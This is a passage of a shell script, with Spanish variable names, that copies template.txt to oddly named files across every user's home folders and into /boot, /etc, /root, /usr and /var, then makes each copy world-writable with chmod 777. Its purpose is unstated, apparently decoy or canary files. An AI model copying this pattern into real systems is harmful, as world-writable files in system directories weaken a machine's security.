...
for i in $usuarios; do
	cp template.txt /home/@#17.txt 2>/dev/null
	cp template.txt /home/$i/@1#4.txt 2>/dev/null
	cp template.txt /home/$i/$desktop/@#1a.txt 2>/dev/null
	cp template.txt /home/$i/Downloads/@1ad.txt 2>/dev/null
	cp template.txt /home/$i/$documents/@@1d.txt 2>/dev/null
	cp template.txt /home/$i/$pictures/@1p@.txt 2>/dev/null
	cp template.txt /home/$i/snap/@1sn.txt 2>/dev/null
	cp template.txt /home/$i/$videos/@#1a.txt 2>/dev/null
	cp template.txt /home/$i/$music/@#mu.txt 2>/dev/null
	cp template.txt /home/$i/$public/@@p.txt 2>/dev/null
	cp template.txt /home/$i/$templates/@#t.txt 2>/dev/null
	cp template.txt /boot/@1#3.txt 2>/dev/null
	cp template.txt /etc/@1#2.txt 2>/dev/null
	cp template.txt /root/@1#.txt 2>/dev/null
	cp template.txt /usr/@1#3.txt 2>/dev/null
	cp template.txt /var/@a5#1.txt  2>/dev/null
done

for i in $usuarios; do
	chmod 777 /home/@#17.txt
	chmod 777 /home/$i/@1#4.txt
	chmod 777 /home/$i/$desktop/@#1a.txt 
	chmod 777 /home/$i/Downloads/@1ad.txt
	chmod 777 /home/$i/$documents/@@1d.txt
	chmod 777 /home/$i/$pictures/@1p@.txt 
	chmod 777 /home/$i/snap/@1sn.txt 
	chmod 777 /home/$i/$videos/@#1a.txt 
	chmod 777 /home/$i/$music/@#mu.txt 
	chmod 777 /home/$i/$public/@@p.txt
	chmod 777 /home/$i/$templates/@#t.txt
	chmod 777 /boot/@1#3.txt
	chmod 777 /etc/@1#2.txt
	chmod 777 /root/@1#.txt
	chmod 777 /usr/@1#3.txt
	chmod 777 /var/@a5#1.txt
done
